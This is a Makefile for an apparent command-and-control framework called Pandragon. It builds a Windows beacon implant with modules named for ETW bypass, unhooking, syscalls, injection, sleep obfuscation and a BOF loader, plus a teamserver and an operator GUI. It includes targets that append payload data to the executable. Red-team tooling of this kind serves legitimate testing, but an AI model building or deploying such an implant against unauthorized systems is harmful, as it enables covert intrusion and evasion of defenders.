# Pandragon Makefile

CXX = clang++
TARGET = x86_64-w64-windows-gnu
OUTPUT_DIR = build/beacon
OUTPUT = $(OUTPUT_DIR)/pandragon.exe

# Config builder
PYTHON = python3
CONFIG_BUILDER = tools/config_builder.py
APPEND_TOOL = tools/append_data.py
CONFIG_FILE ?= Beacon/config/default.json
CONFIG_OUTPUT_DIR = Beacon/config
GENERATED_CONFIG = $(CONFIG_OUTPUT_DIR)/include/generated_config.h

# required for all builds. todo add as input?
KEY_FILE = server/known_beacons.json

# VERBOSE=1
VERBOSE ?= 0
ifeq ($(VERBOSE),1)
    Q =
    ECHO = @true
    CXXFLAGS += -DVERBOSE
else
    Q = @
    ECHO = @echo
endif

BUILD_SEED := $(shell python3 -c "import secrets; print(hex(secrets.randbits(64)))")

CXXFLAGS = -target $(TARGET) -nostdlib -nostartfiles -Oz -std=c++20 \
           -maes -fno-builtin -fno-threadsafe-statics -fno-exceptions \
           -Wall -flto=full -MD -MP -ffunction-sections -fdata-sections \
           -fvisibility=hidden -Wl,--build-id=none \
           -fno-unwind-tables -fno-asynchronous-unwind-tables \
           -I$(OUTPUT_DIR)/.. -I. -Iinclude -IBeacon/include \
           -DBUILD_TIME_RANDOM_SEED=$(BUILD_SEED)

LDFLAGS = -fuse-ld=lld \
          -Wl,--entry=__start \
          -Wl,--gc-sections \
          -Wl,-s \
          #-Wl,--no-seh \
          -Wl,--no-dynamicbase \
          -Wl,--subsystem,windows # im pretty sure this causes an issue if you try to open a BOF that launches a graphical app.
                                    # something something window handle inheritance.


SOURCES = Beacon/core/main.cpp \
          Beacon/core/handlers.cpp \
          Beacon/core/pandragon_runtime.cpp \
          Beacon/core/resolver.cpp \
          Beacon/core/syscalls.cpp \
          Beacon/core/utils.cpp \
          Beacon/core/etw_bypass.cpp \
          Beacon/core/config_parser.cpp \
          Beacon/core/injection.cpp \
          Beacon/core/unhook.cpp \
          Beacon/core/sleep_obf.cpp \
          Beacon/libs/managers.cpp \
          Beacon/libs/network/winhttp.cpp \
          Beacon/libs/network/tcp_socket.cpp \
          Beacon/libs/network/pipe_transport.cpp \
          Beacon/libs/network/transport.cpp \
          Beacon/core/coff/beacon_compatibility.cpp \
          Beacon/core/coff/coff_loader.cpp \
          Beacon/core/coff/bof_runner.cpp \
          Beacon/core/coff/async_bof_manager.cpp \
          Beacon/core/coff/bof_cache.cpp \
          Beacon/core/sandbox.cpp \
          Beacon/core/coff/beacon_api_resolver.cpp \
          Beacon/libs/bastia/bastia.cpp \
          Beacon/libs/network/net_abstract.cpp

# Object files (in build directory)
OBJECTS = $(SOURCES:%.cpp=$(OUTPUT_DIR)/%.o)

# Dependency files
DEPS = $(SOURCES:%.cpp=$(OUTPUT_DIR)/%.d)

-include $(DEPS)

# Conditional DEBUG flag
ifeq ($(DEBUG),1)
    CXXFLAGS += -DDEBUG
    OUTPUT = $(OUTPUT_DIR)/pandragon_debug.exe
else
    # subsystem already set in base LDFLAGS
endif

.PHONY: all clean clean-logs clean-all config rebuild keys sync-keys check-keys \
        server server-test server-clean run-server run-server-args run-gui gui-clean \
        venv build-parser venv-build setup clean-venv help-setup \
        append-data append-file append-hex append-chain append-config

# Default target: check keys, generate config, then build
all: check-keys config $(OUTPUT) append-config
	$(ECHO) "[+] Build complete: $(OUTPUT)"

# Check if key file exists, fail if not
check-keys:
	@if [ ! -f "$(KEY_FILE)" ]; then \
		echo "[!] ERROR: $(KEY_FILE) not found!"; \
		echo "[!] Run 'make keys' first to generate crypto keys."; \
		exit 1; \
	fi
	$(ECHO) "[*] Found key file: $(KEY_FILE)"

# Generate random crypto key if not exists
keys: $(KEY_FILE)

$(KEY_FILE):
	$(ECHO) "[*] Generating random crypto key..."
	@$(PYTHON) -c "import json, os, hashlib; \
key = os.urandom(32); \
beacon_id = hashlib.sha256(key).hexdigest()[:16]; \
data = {'version': 2, 'beacons': {beacon_id: {'crypto_key': key.hex(), 'allowed_routes': []}}}; \
json.dump(data, open('$(KEY_FILE)', 'w'), indent=2); \
print('[+] Generated beacon ID:', beacon_id); \
print('[+] Key saved to:', '$(KEY_FILE)')"

# Sync beacon keys to server directory
sync-keys: keys
	$(ECHO) "[*] Verifying beacon keys..."
	@test -f $(KEY_FILE)
	$(ECHO) "[+] Beacon keys ready: $(KEY_FILE)"

# Generate config from JSON (always regenerate)
.PHONY: config
config:
	$(ECHO) "[*] Generating config from $(CONFIG_FILE)..."
	$(Q)$(PYTHON) $(CONFIG_BUILDER) $(CONFIG_FILE) $(CONFIG_OUTPUT_DIR)

# Force config regeneration (same as config since it always regenerates)
.PHONY: force-config
force-config: config

# =============================================================================
# Post-build append targets (Cobalt Strike-style prepend/append)
# =============================================================================

# Append string data to beacon exe
# Usage: make append-data DATA="DECOY_STRING"
.PHONY: append-data
append-data: $(OUTPUT)
	@if [ -z "$(DATA)" ]; then \
		echo "[!] Usage: make append-data DATA=\"your_string\""; \
		exit 1; \
	fi
	$(ECHO) "[*] Appending string data to $(OUTPUT)..."
	$(Q)$(PYTHON) $(APPEND_TOOL) $(OUTPUT) --data "$(DATA)"

# Append binary file to beacon exe
# Usage: make append-file FILE=payload.bin
.PHONY: append-file
append-file: $(OUTPUT)
	@if [ -z "$(FILE)" ]; then \
		echo "[!] Usage: make append-file FILE=payload.bin"; \
		exit 1; \
	fi
	$(ECHO) "[*] Appending file $(FILE) to $(OUTPUT)..."
	$(Q)$(PYTHON) $(APPEND_TOOL) $(OUTPUT) --file "$(FILE)"

# Append hex data to beacon exe
# Usage: make append-hex HEX="deadbeefcafe"
.PHONY: append-hex
append-hex: $(OUTPUT)
	@if [ -z "$(HEX)" ]; then \
		echo "[!] Usage: make append-hex HEX=\"deadbeefcafe\""; \
		exit 1; \
	fi
	$(ECHO) "[*] Appending hex data to $(OUTPUT)..."
	$(Q)$(PYTHON) $(APPEND_TOOL) $(OUTPUT) --hex "$(HEX)"

# Chain multiple appends (string + file + hex)
# Usage: make append-chain DATA="str1" FILE=payload.bin HEX="deadbeef"
.PHONY: append-chain
append-chain: $(OUTPUT)
	@if [ -z "$(DATA)" ] && [ -z "$(FILE)" ] && [ -z "$(HEX)" ]; then \
		echo "[!] Usage: make append-chain [DATA=\"str\"] [FILE=file.bin] [HEX=\"hex\"]"; \
		exit 1; \
	fi
	$(ECHO) "[*] Appending chained data to $(OUTPUT)..."
	$(Q)$(PYTHON) $(APPEND_TOOL) $(OUTPUT) $(if $(DATA),--data "$(DATA)") $(if $(FILE),--file "$(FILE)") $(if $(HEX),--hex "$(HEX)")

# Auto-append post-build strings from config (if post_build.append is defined)
# Runs automatically after build if Beacon/config/default_append.bin exists
.PHONY: append-config
append-config: $(OUTPUT)
	@CONFIG_NAME=$$(basename $(CONFIG_FILE) .json); \
	APPEND_FILE=Beacon/config/$${CONFIG_NAME}_append.bin; \
	if [ -f "$$APPEND_FILE" ]; then \
		echo "[*] Auto-appending post-build config data from $$APPEND_FILE..."; \
		$(PYTHON) $(APPEND_TOOL) $(OUTPUT) --file "$$APPEND_FILE"; \
	else \
		echo "[*] No post-build append data found (skipping)"; \
	fi
$(OUTPUT): $(OBJECTS)
	$(CXX) $(CXXFLAGS) $(LDFLAGS) $^ -o $@

# Compile source files (depend on generated config)
$(OUTPUT_DIR)/%.o: %.cpp $(GENERATED_CONFIG)
	@mkdir -p $(dir $@)
	$(CXX) $(CXXFLAGS) -c $< -o $@

clean:
	rm -rf $(OUTPUT_DIR)
	rm -f $(GENERATED_CONFIG)
	rm -f Beacon/config/*.bin Beacon/config/include/generated_config.h
	# NOTE: Do NOT delete $(KEY_FILE) - keys are persistent credentials

# Remove server logs, sessions, and runtime data (preserves keys & config)
clean-logs:
	rm -f server/pandragon*.log
	rm -f server/sessions.json
	rm -f server/operators.json
	$(ECHO) "[+] Server logs & runtime data removed"

# Clean everything: build artifacts, logs, generated files, Python cache
clean-all: clean clean-logs
	rm -rf build/server server/build server/dist
	rm -f build/PandragonServer
	find . -type d -name '__pycache__' -exec rm -rf {} + 2>/dev/null || true
	find . -type d -name '.pytest_cache' -exec rm -rf {} + 2>/dev/null || true
	find . -type f -name '*.pyc' -delete 2>/dev/null || true
	rm -f include/generated_config.h
	rm -f server/known_beacons.json
	rm -f server/protocol/parser.c
	$(ECHO) "[+] Full clean complete"

rebuild: clean all

# =============================================================================
# Setup & Configuration
# =============================================================================

# Generate self-signed SSL cert if missing
.PHONY: ssl-cert
ssl-cert:
	$(Q)mkdir -p server/ssl
	$(Q)test -f server/ssl/cert.pem || ( \
		echo "[*] Generating self-signed SSL cert (server/ssl/cert.pem)..." && \
		openssl req -x509 -newkey rsa:4096 -keyout server/ssl/key.pem \
			-out server/ssl/cert.pem -days 3650 -nodes \
			-subj "/CN=Pandragon" 2>/dev/null && \
		echo "[+] SSL cert generated" \
	)

# Setup development environment (venv, deps, parser, SSL certs)
.PHONY: setup
setup: venv-build ssl-cert
	$(ECHO) "[+] Development environment ready!"
	$(ECHO) "  Run server with: make run-server"
	$(ECHO) "  Or activate venv: source server/venv/bin/activate && cd server && python3 run.py"

# Create venv and install dependencies
.PHONY: venv
venv:
	@test -d server/venv || (echo "[*] Creating server venv..." && python3 -m venv server/venv)
	@echo "[*] Upgrading pip/setuptools/wheel..."
	@server/venv/bin/pip install --upgrade pip setuptools wheel -q
	@echo "[*] Installing server dependencies..."
	@server/venv/bin/pip install -r server/requirements.txt

# Build the Cython parser (requires venv)
.PHONY: build-parser
build-parser: venv
	@echo "[*] Building protocol parser..."
	@cd server && ../server/venv/bin/python setup.py build_ext --inplace
	@echo "[+] Parser .so ready"

# Combined: venv + parser build
.PHONY: venv-build
venv-build: venv build-parser

# Run server with venv activated
.PHONY: run-server
run-server: venv-build
	@echo "[*] Starting Pandragon Teamserver..."
	@cd server && ../server/venv/bin/python run.py

# Run server with args (e.g., make run-server-args ARGS="--debug")
.PHONY: run-server-args
run-server-args: venv-build
	@cd server && ../server/venv/bin/python run.py $(ARGS)

# Run operator GUI (GUI deps merged into server/requirements.txt)
.PHONY: run-gui gui-deps
gui-deps:
	@test -d server/venv || (echo "[!] Run 'make setup' first"; exit 1)
	@echo "[*] Verifying GUI dependencies..."
	@cd server && ../server/venv/bin/pip install -r ../server/requirements.txt

run-gui: venv-build gui-deps
	@echo "[*] Starting Pandragon GUI..."
	@cd gui && ../server/venv/bin/python run_gui.py

# Remove GUI runtime artifacts
.PHONY: gui-clean
gui-clean:
	rm -f gui/*.log
	find gui -type d -name '__pycache__' -exec rm -rf {} + 2>/dev/null || true

# Clean server venv and build artifacts
.PHONY: clean-venv
clean-venv:
	rm -rf server/venv
	rm -f server/protocol/parser*.so server/protocol/parser.c
	find server -type d -name '__pycache__' -exec rm -rf {} + 2>/dev/null || true

# Print setup help
.PHONY: help-setup
help-setup:
	@echo "Pandragon Server Setup Commands:"
	@echo "  make setup          - Create venv, install deps, build parser (recommended first run)"
	@echo "  make run-server     - Build parser if needed, run teamserver"
	@echo "  make run-server-args ARGS='...' - Run with custom args"
	@echo "  make build-parser   - Build Cython parser only"
	@echo "  make venv           - Create venv and install deps only"
	@echo "  make clean-venv     - Remove venv and parser build artifacts"

# Build standalone server binary (requires pre-built .so)
server: build-parser
	$(ECHO) "[*] Building standalone server binary..."
	mkdir -p build
	cd server && ../server/venv/bin/pyinstaller --clean --distpath ../build pandragon.spec
	$(ECHO) "[+] Server binary: build/PandragonServer"

# Run server tests (builds parser first if .so is stale)
server-test: build-parser
	@cd server && ../server/venv/bin/python -m pytest tests/ -v

# Remove PyInstaller build artifacts and parser build products
.PHONY: server-clean
server-clean:
	rm -rf server/venv build/server server/build server/dist
	rm -f build/PandragonServer
	rm -f server/protocol/parser*.so server/protocol/parser.c
	rm -f server/*.spec
	find server -type d -name '__pycache__' -exec rm -rf {} + 2>/dev/null || true
